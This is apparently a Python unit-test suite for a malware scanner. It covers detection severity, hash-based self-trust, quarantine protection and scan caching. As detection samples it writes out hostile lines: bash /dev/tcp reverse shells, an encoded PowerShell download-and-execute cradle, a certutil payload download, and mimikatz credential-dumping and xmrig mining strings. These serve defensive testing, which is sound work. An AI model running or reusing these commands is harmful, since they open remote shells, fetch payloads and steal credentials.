import base64, hashlib, json, os, shutil, tempfile, threading, time, unittest, urllib.request
from pathlib import Path
from ultrimater.shield import scopes
from ultrimater.shield.quarantine import ConfirmationRequired, QuarantineError
from ultrimater.shield.scancache import ScanCache
from ultrimater.shield.scanner import EICAR, ULTRIMATER_MARKER, ULTRIMATER_SIM, Scanner, inspect_content
from ultrimater.shield.trust import MANIFEST_NAME, TrustStore
from ultrimater.api.server import create_server
from tests.helpers import SALT, new_app

PROJECT = Path(__file__).resolve().parent.parent


def f(name, data, **kw): return inspect_content(name, data, None, SALT, hashlib.sha256(data).hexdigest(), **kw)
def sev(name, data): return [x.severity.value for x in f(name, data)]


class DangerClassificationTests(unittest.TestCase):
    def test_a_real_test_file_is_harmless_not_a_danger(self):
        r = f("eicar.txt", EICAR); self.assertEqual((r[0].severity.value, r[0].confidence.value), ("low", "high"))
        self.assertIn("harmless", r[0].title.lower()); self.assertIn("not a danger", r[0].explanation)

    def test_test_string_inside_a_larger_file_is_only_a_mention(self):
        r = f("README.md", b"To test antivirus, create a file containing: " + EICAR + b"\n" + b"more text\n" * 100)
        self.assertEqual([x.severity.value for x in r], ["info"]); self.assertEqual(r[0].category, "shield.signature_mention")

    def test_simulated_threat_is_high_and_clearly_labelled(self):
        r = f("evil.txt", ULTRIMATER_SIM); self.assertEqual(r[0].severity.value, "high"); self.assertIn("SIMULATED", r[0].explanation); self.assertIn("Simulated", r[0].title)

    def test_files_matching_many_unrelated_attack_families_look_like_rulesets(self):
        data = b"mimikatz sekurlsa:: bash -i >& /dev/tcp/1.2.3.4/9 0>&1 stratum+tcp://pool xmrig --donate-level"
        r = f("rules.txt", data); self.assertEqual([x.severity.value for x in r], ["info"]); self.assertEqual(r[0].category, "shield.ruleset_like")

    def test_precision_cap_and_source_code_lowering(self):
        self.assertEqual(sev("n.txt", b"run mimikatz then sekurlsa::logonpasswords"), ["medium"])          # moderate-precision rule: capped at Medium
        self.assertEqual(sev("a.sh", b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"), ["high"])                    # high-precision rule keeps High
        self.assertEqual(sev("a.py", b"os.system('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')"), ["medium"])   # in source code: lowered one level

    def test_independent_checks_agreeing_raise_severity(self):
        cmd = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')".encode("utf-16le"))
        script = b"powershell -enc " + cmd + b"\ncertutil -urlcache -split -f http://x.test/p.exe %temp%\\p.exe"
        r = f("drop.ps1", script); top = max(r, key=lambda x: ["info", "low", "medium", "high"].index(x.severity.value))
        self.assertEqual(top.severity.value, "high"); self.assertTrue(any("Corroborated" in e.description for e in top.evidence))

    def test_one_weak_signal_never_reaches_high(self):
        for name, data in [("a.ps1", b"Invoke-WebRequest http://x"), ("k.txt", b"mimikatz"), ("m.txt", b"xmrig stratum+tcp://a")]:
            self.assertNotIn("high", sev(name, data), name)


class SelfTrustTests(unittest.TestCase):
    def make_install(self):
        root = Path(tempfile.mkdtemp()) / "Ultrimater"; (root / "pkg").mkdir(parents=True)
        (root / "pkg" / "scanner.py").write_bytes(b"MARK = b'" + ULTRIMATER_MARKER + b"'\n# bash -i >& /dev/tcp/1.2.3.4/9 0>&1 mimikatz xmrig stratum+tcp://x --donate-level\n")
        (root / "tests.py").write_bytes(b"x = b'" + EICAR + b"'")
        (root / "notes.txt").write_text("just my notes")
        ts = TrustStore(root); ts.rebuild(); return root, TrustStore(root)

    def test_reproduction_without_trust_the_files_are_flagged(self):                                # the user's complaint, reproduced
        root, _ = self.make_install()
        res, fs = Scanner(SALT, mode="smart").scan(str(root)); self.assertTrue(len(fs) >= 1)

    def test_own_files_are_trusted_by_hash_and_produce_no_findings(self):
        root, ts = self.make_install()
        res, fs = Scanner(SALT, mode="smart", trust=ts).scan(str(root))
        self.assertEqual(fs, []); self.assertEqual(res.verdict, "clean"); self.assertEqual(res.files_trusted, res.files_scanned)

    def test_a_modified_own_file_is_reported_as_tampering(self):
        root, ts = self.make_install()
        (root / "pkg" / "scanner.py").write_bytes(b"import os; os.system('evil')\n")
        res, fs = Scanner(SALT, trust=ts).scan(str(root))
        self.assertEqual([x.category for x in fs], ["shield.self_modified"]); self.assertEqual(res.files_trusted, 3)   # tests.py, notes.txt and the manifest itself

    def test_unexpected_program_in_the_folder_is_reported_but_plain_files_are_not(self):
        root, ts = self.make_install()
        (root / "dropped.ps1").write_text("Write-Host hi"); (root / "readme.txt").write_text("added by me")
        _, fs = Scanner(SALT, trust=ts).scan(str(root)); self.assertEqual([x.category for x in fs], ["shield.self_unexpected"])

    def test_trust_is_by_content_not_by_folder_name(self):
        root, ts = self.make_install()
        other = Path(tempfile.mkdtemp()) / "Ultrimater"; shutil.copytree(root, other)             # same name, same files, but NOT the install folder
        _, fs = Scanner(SALT, mode="smart", trust=ts).scan(str(other)); self.assertTrue(len(fs) >= 1)

    def test_python_bytecode_cache_of_our_modules_is_trusted(self):
        root, ts = self.make_install(); (root / "pkg" / "__pycache__").mkdir(); (root / "pkg" / "__pycache__" / "scanner.cpython-312.pyc").write_bytes(b"\0" + ULTRIMATER_MARKER)
        self.assertEqual(Scanner(SALT, trust=ts).scan(str(root))[1], [])

    def test_the_real_project_scans_clean_with_its_own_manifest(self):                               # the actual project, copied so nothing is modified
        copy = Path(tempfile.mkdtemp()) / "ultrimater"
        shutil.copytree(PROJECT, copy, ignore=shutil.ignore_patterns("__pycache__", ".git", MANIFEST_NAME)); ts = TrustStore(copy); n = ts.rebuild()
        res, fs = Scanner(SALT, mode="smart", trust=ts).scan(str(copy))
        self.assertEqual([x.title for x in fs], []); self.assertEqual(res.verdict, "clean"); self.assertGreaterEqual(res.files_trusted, n)
        bare, bad = Scanner(SALT, mode="smart").scan(str(copy)); self.assertGreaterEqual(len(bad), 1)   # and without the manifest it would not be

    def test_verify_passes_on_an_untouched_install(self):
        root, ts = self.make_install(); v = ts.verify(); self.assertTrue(v["ok"]); self.assertEqual(v["modified"], [])

    def test_verify_detects_changes(self):
        root, ts = self.make_install(); (root / "tests.py").write_text("changed"); (root / "evil.exe").write_bytes(b"MZ")
        v = ts.verify(); self.assertFalse(v["ok"]); self.assertEqual(v["modified"], ["tests.py"]); self.assertEqual(v["unexpected_programs"], ["evil.exe"])
        ts.rebuild(); self.assertTrue(ts.verify()["ok"])

    def test_missing_manifest_means_nothing_is_trusted(self):
        root, _ = self.make_install(); (root / MANIFEST_NAME).unlink(); ts = TrustStore(root)
        self.assertFalse(ts.available); self.assertTrue(len(Scanner(SALT, mode="smart", trust=ts).scan(str(root))[1]) >= 1)


class AppIntegrationTests(unittest.TestCase):
    def wait(self, app, sid):
        for _ in range(300):
            s = app.scan_status(sid)
            if s and s["status"] != "running": return s
            time.sleep(0.05)

    def test_vault_is_never_rescanned_and_demo_is_skipped_in_broad_scans(self):
        app = new_app(); marker = app.paths.vault / "q_1.quar"; marker.write_bytes(ULTRIMATER_SIM)
        s = self.wait(app, app.start_scan(str(app.paths.home))["scan_id"])
        self.assertEqual((s["verdict"], s["finding_ids"]), ("clean", [])); self.assertTrue(any("vault" in d["reason"] for d in s["skipped_dirs"]))
        demo_file = app.paths.demo / "x.txt"; demo_file.parent.mkdir(exist_ok=True); demo_file.write_bytes(ULTRIMATER_SIM)
        plan = scopes.ScopePlan("user", "My user folders", [app.paths.home], [], True, "", "")
        from unittest import mock
        with mock.patch.object(scopes, "build_plan", return_value=plan):
            s = self.wait(app, app.start_scan(scope="user", consent=True)["scan_id"])
        self.assertEqual(s["finding_ids"], []); self.assertTrue(any("demo" in d["reason"].lower() for d in s["skipped_dirs"]))
        s = self.wait(app, app.start_scan(str(app.paths.demo))["scan_id"]); self.assertEqual(len(s["finding_ids"]), 1)      # picking it yourself still scans it

    def test_ultrimaters_own_files_cannot_be_quarantined(self):
        app = new_app(); inside = app.trust.root / "tests" / "_tmp_probe.txt"; inside.write_bytes(ULTRIMATER_SIM)
        try:
            with self.assertRaises(QuarantineError): app.vault.quarantine(str(inside), None, confirm=True)
            self.assertTrue(inside.exists()); self.assertTrue(app.vault.is_protected(inside))
        finally: inside.unlink(missing_ok=True)

    def test_trust_this_exact_file_by_hash(self):
        app = new_app(); d = Path(tempfile.mkdtemp()); (d / "a.txt").write_bytes(ULTRIMATER_SIM)
        self.wait(app, app.start_scan(str(d))["scan_id"]); fnd = app.db.list_findings(module="shield")[0]
        self.assertIn("trust_hash", [a["type"] for a in app.response.available_actions(fnd)])
        with self.assertRaises(ConfirmationRequired): app.response.execute("trust_hash", fnd.id, confirm=False)
        app.response.execute("trust_hash", fnd.id, confirm=True)
        (d / "renamed_copy.txt").write_bytes(ULTRIMATER_SIM)                                           # same content, new name: still trusted
        s = self.wait(app, app.start_scan(str(d))["scan_id"]); self.assertEqual(s["finding_ids"], [])
        (d / "a.txt").write_bytes(ULTRIMATER_SIM + b" changed"); s = self.wait(app, app.start_scan(str(d))["scan_id"]); self.assertEqual(len(s["finding_ids"]), 1)   # changed content is checked again

    def test_integrity_api(self):
        app = new_app(); srv, tok = create_server(app, 0); threading.Thread(target=srv.serve_forever, daemon=True).start()
        def call(m, p, body=None):
            r = urllib.request.Request(f"http://127.0.0.1:{srv.server_address[1]}{p}", method=m, headers={"X-Session-Token": tok}, data=json.dumps(body).encode() if body is not None else None)
            try:
                with urllib.request.urlopen(r) as x: return x.status, json.loads(x.read())
            except urllib.error.HTTPError as e: return e.code, json.loads(e.read())
        try:
            s, v = call("GET", "/api/integrity"); self.assertEqual(s, 200); self.assertIn("modified", v)
            self.assertEqual(call("POST", "/api/integrity/rebuild", {})[0], 409)                       # rebuilding trust needs explicit confirmation
        finally: srv.shutdown()


class ScanCacheTests(unittest.TestCase):
    def setUp(self):
        self.app = new_app(); self.d = Path(tempfile.mkdtemp())
        for i in range(30): (self.d / f"f{i}.txt").write_text(f"file {i}")

    def scan(self, mode="smart"):
        sc = self.app._make_scanner(mode, cache=True); res, fs = sc.scan(str(self.d)); sc.cache.flush() if sc.cache else None; return res, fs

    def test_unchanged_clean_files_are_skipped_on_the_second_scan(self):
        first, _ = self.scan(); self.assertEqual((first.files_full, first.files_cached), (30, 0))
        second, _ = self.scan(); self.assertEqual((second.files_cached, second.files_scanned), (30, 30)); self.assertEqual(second.bytes_scanned, 0)

    def test_a_changed_file_is_rescanned_and_findings_are_never_cached(self):
        self.scan(); (self.d / "f1.txt").write_bytes(ULTRIMATER_SIM)
        r, fs = self.scan(); self.assertEqual((r.files_cached, len(fs)), (29, 1))
        r, fs = self.scan(); self.assertEqual((r.files_cached, len(fs)), (29, 1))                      # still reported every time

    def test_deep_mode_ignores_the_cache(self):
        self.scan(); r, _ = self.scan("deep"); self.assertEqual((r.files_cached, r.files_full), (0, 30))

    def test_changing_the_hash_list_invalidates_the_cache(self):
        self.scan(); h = self.d / "list.txt"; h.write_text("a" * 64); self.app.import_hashlist(str(h))
        r, _ = self.scan(); self.assertEqual(r.files_cached, 0)
